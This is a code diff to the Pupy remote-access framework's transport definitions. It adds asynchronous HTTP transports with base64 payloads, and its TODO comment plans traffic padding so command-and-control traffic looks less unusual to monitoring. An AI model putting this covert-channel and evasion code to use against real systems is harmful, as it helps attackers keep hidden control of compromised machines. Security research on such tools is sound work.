@@ -4,8 +4,8 @@
 
 import os
 import logging
-from .servers import PupyTCPServer
-from .clients import PupyTCPClient, PupySSLClient, PupyProxifiedTCPClient, PupyProxifiedSSLClient
+from .servers import PupyTCPServer, PupyAsyncTCPServer
+from .clients import PupyTCPClient, PupySSLClient, PupyProxifiedTCPClient, PupyProxifiedSSLClient, PupyAsyncClient
 from .transports import dummy, b64, http
 try:
 	from .transports.obfs3 import obfs3
@@ -20,7 +20,7 @@ except ImportError as e:
 	#to make pupy works even without scramblesuit dependencies
 	logging.warning("%s. The scramblesuit transport has been disabled."%e)
 	scramblesuit=None
-from .streams import PupySocketStream
+from .streams import *
 from .launchers.simple import SimpleLauncher
 from .launchers.auto_proxy import AutoProxyLauncher
 from .launchers.bind import BindLauncher
@@ -104,13 +104,26 @@ transports["tcp_base64"]={
 		"server_transport_kwargs": {},
 	}
 
-transports["http_cleartext"]={
-		"info" : "TCP transport using HTTP with base64 encoded payloads",
+transports["sync_http_cleartext"]={ #TODO fill with empty requests/response between each request/response to have only a following of req/res and not unusual things like req/req/req/res/res/req ...
+		"info" : "TCP transport using HTTP with base64 encoded payloads (synchrone with Keep-Alive headers and one 3-way-handshake)",
 		"server" : PupyTCPServer,
 		"client": PupyTCPClient,
 		"client_kwargs" : {},
 		"authenticator" : None,
 		"stream": PupySocketStream ,
+		"client_transport" : http.PupyHTTPClient,
+		"server_transport" : http.PupyHTTPServer,
+		"client_transport_kwargs": {},
+		"server_transport_kwargs": {},
+	}
+
+transports["async_http_cleartext"]={
+		"info" : "TCP transport using HTTP with base64 encoded payloads (asynchrone with client pulling the server and multiple 3-way handshakes (slow))",
+		"server" : PupyAsyncTCPServer,
+		"client": PupyAsyncClient,
+		"client_kwargs" : {},
+		"authenticator" : None,
+		"stream": PupyAsyncTCPStream ,
 		"client_transport" : http.PupyHTTPClient,
 		"server_transport" : http.PupyHTTPServer,
 		"client_transport_kwargs": {},
